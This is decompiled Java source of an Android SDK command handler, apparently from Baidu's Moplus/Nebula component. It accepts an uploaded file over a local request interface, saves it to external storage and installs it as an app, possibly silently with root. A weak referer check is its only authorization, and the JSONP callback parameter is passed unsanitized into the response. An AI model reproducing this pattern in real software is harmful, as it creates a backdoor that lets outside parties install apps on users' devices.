package com.baidu.android.nebula.cmd;

import android.content.Context;
import android.os.Environment;
import android.text.TextUtils;
import com.baidu.android.moplus.util.NoProGuard;
import com.baidu.android.nebula.b.n;
import com.baidu.android.nebula.b.u;
import com.baidu.tbadk.core.diskCache.ImagesInvalidReceiver;
import java.io.File;
import java.util.Map;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: classes.dex */
public class UploadFile implements NoProGuard, d {
    private static final boolean DEBUG = false;
    public static final String ERROR_FILE_WRITE_FAIL = "write File fail";
    public static final String OTHER_PATH = "/inapp";
    public static final String REQUEST_NAME = "uploadFile";
    private static final String TAG = UploadFile.class.getSimpleName();
    public static final int UPLOAD_ERROR_JSON_PARSE = 1002;
    public static final int UPLOAD_ERROR_KNOW = 1003;
    public static final int UPLOAD_ERROR_SDCARD_UNMOUNTED = 1000;
    public static final int UPLOAD_ERROR_WRITE_FAIL = 1001;
    protected String filePath = "";
    protected String srcPath = "";
    protected String installType = "";
    protected String fileName = "";
    protected Context mContext = null;
    private Object lock = new Object();
    private int mErrcode = 0;

    public UploadFile() {
        a.a();
        a.a(TAG);
    }

    private JSONObject makeData(String str) {
        JSONObject jSONObject = new JSONObject();
        JSONObject jSONObject2 = new JSONObject();
        try {
            File file = new File(str);
            jSONObject2.put("path", str);
            jSONObject2.put("file_add_time", file.lastModified());
            jSONObject2.put("file_size", file.length());
            jSONObject2.put("file_name", file.getName());
            jSONObject.put("status", ImagesInvalidReceiver.SUCCESS);
            jSONObject.put("file_info", jSONObject2);
        } catch (Exception e) {
            try {
                jSONObject.put("status", "fail");
                jSONObject.put("error_code", 1002);
            } catch (JSONException e2) {
                e2.printStackTrace();
            }
        }
        return jSONObject;
    }

    @Override // com.baidu.android.nebula.cmd.d
    public com.baidu.android.nebula.b.c execute(com.baidu.android.nebula.b.k kVar, Map map, Map map2, Map map3) {
        return upload(map, map2, map3);
    }

    public com.baidu.android.nebula.b.c upload(Map map, Map map2, Map map3) {
        a.a(System.currentTimeMillis());
        if (map2 == null || map2.size() < 3) {
            a.a(-1);
            return null;
        }
        String str = (String) map2.get("callback");
        a.d((String) map2.get("mcmdf"));
        this.mContext = com.baidu.android.nebula.d.b.a().c();
        if (this.mContext == null) {
            a.a(-1);
            return null;
        }
        if (!com.baidu.android.nebula.d.a.a(this.mContext).a((String) map.get("referer"))) {
            this.mErrcode = 4;
        }
        if (this.mErrcode != 4) {
            this.fileName = (String) map2.get("Filename");
            this.installType = (String) map2.get("install_type");
            this.srcPath = (String) map3.get("file");
            if (TextUtils.isEmpty(this.fileName) || TextUtils.isEmpty(this.srcPath)) {
                return new com.baidu.android.nebula.b.c(u.BAD_REQUEST, "text/plain", "Error 400, Bad Request");
            }
            JSONObject jSONObject = new JSONObject();
            if (!Environment.getExternalStorageState().equals("mounted")) {
                try {
                    jSONObject.put("status", "fail");
                    jSONObject.put("error_code", 1000);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                return new com.baidu.android.nebula.b.c(jSONObject.toString());
            }
            this.filePath = Environment.getExternalStorageDirectory().getPath() + OTHER_PATH;
            this.filePath = n.a(this.srcPath, this.filePath, this.fileName);
            if (this.filePath.length() != 0 && !TextUtils.isEmpty(this.installType)) {
                if (this.installType.equalsIgnoreCase("onlyroot")) {
                    com.baidu.android.defense.pkgmanager.d.a(this.mContext).a(this.filePath, this.mContext);
                } else if (this.installType.equalsIgnoreCase("all")) {
                    com.baidu.android.defense.pkgmanager.d.a(this.mContext).b(this.filePath, this.mContext);
                }
            }
        }
        JSONObject jSONObject2 = new JSONObject();
        try {
            jSONObject2.put("error", this.mErrcode);
        } catch (JSONException e2) {
        }
        com.baidu.android.nebula.b.c cVar = new com.baidu.android.nebula.b.c(str + " && " + str + "(" + jSONObject2.toString() + ");");
        a.a(this.mErrcode);
        return cVar;
    }

    @Override // com.baidu.android.nebula.cmd.d
    public void writeToStatic() {
        k.a().a(this.mContext, a.toString());
    }
}
